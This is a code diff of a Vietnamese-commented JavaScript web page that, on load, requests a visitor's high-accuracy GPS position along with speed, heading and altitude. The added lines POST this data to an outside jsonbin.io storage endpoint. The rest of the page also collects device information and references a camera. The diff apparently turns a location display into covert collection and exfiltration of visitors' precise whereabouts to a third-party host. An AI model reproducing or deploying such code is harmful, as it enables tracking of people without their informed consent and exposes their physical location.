@@ -25,7 +25,6 @@ if (!saveInformation && window.location.hostname != 'localhost' && window.locati
     
         let JsonResult = JSON.parse(result);
         JsonResult['device'] = getDeviceInfo();
-        JsonResult['position'] = positionValue;
     
         const raw = JSON.stringify(JsonResult);
         
@@ -137,29 +136,26 @@ function stopCamera() {
 // Vị trí
 window.onload = function () {
     if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(showPosition, showError, {
-        enableHighAccuracy: true, // Bật GPS chính xác cao
-        timeout: 10000,           // 10 giây
-        maximumAge: 0
-    });
-    } else {
-        positionValue = "Trình duyệt không hỗ trợ Geolocation.";
+        navigator.geolocation.getCurrentPosition(showPosition, showError, {
+            enableHighAccuracy: true, // Bật GPS chính xác cao
+            timeout: 10000,           // 10 giây
+            maximumAge: 0
+        });
     }
 };
 
 // Hàm hiển thị thông tin vị trí
-let positionValue = '';
 function showPosition(position) {
     let data = {
-    "Latitude": position.coords.latitude,
-    "Longitude": position.coords.longitude,
-    "Độ chính xác (m)": position.coords.accuracy,
-    "Độ cao (m)": position.coords.altitude,
-    "Độ chính xác độ cao (m)": position.coords.altitudeAccuracy,
-    "Hướng di chuyển (độ)": position.coords.heading,
-    "Tốc độ (m/s)": position.coords.speed,
-    "Thời gian lấy dữ liệu": new Date(position.timestamp).toLocaleString(),
-    "Link Google Maps": `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
+        "Latitude": position.coords.latitude,
+        "Longitude": position.coords.longitude,
+        "Độ chính xác (m)": position.coords.accuracy,
+        "Độ cao (m)": position.coords.altitude,
+        "Độ chính xác độ cao (m)": position.coords.altitudeAccuracy,
+        "Hướng di chuyển (độ)": position.coords.heading,
+        "Tốc độ (m/s)": position.coords.speed,
+        "Thời gian lấy dữ liệu": new Date(position.timestamp).toLocaleString(),
+        "Link Google Maps": `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
     };
 
     // In ra dạng đẹp
@@ -167,7 +163,19 @@ function showPosition(position) {
     for (let key in data) {
         text += `${key}: ${data[key]}\n`;
     }
-    positionValue = text;
+    
+    const raw = JSON.stringify(text);
+    const requestOptions = {
+        method: "POST",
+        headers: myHeaders,
+        body: raw,
+        redirect: "follow"
+    };
+
+    fetch("https://api.jsonbin.io/v3/b", requestOptions)
+    .then((response) => response.text())
+    .then(result)
+    .catch((error) => console.error(error));
 }
 
 // Hàm xử lý lỗi
@@ -186,5 +194,5 @@ function showError(error) {
     default:
         msg = "Lỗi không xác định.";
     }
-    positionValue = msg;
+    console.log(msg);
 }
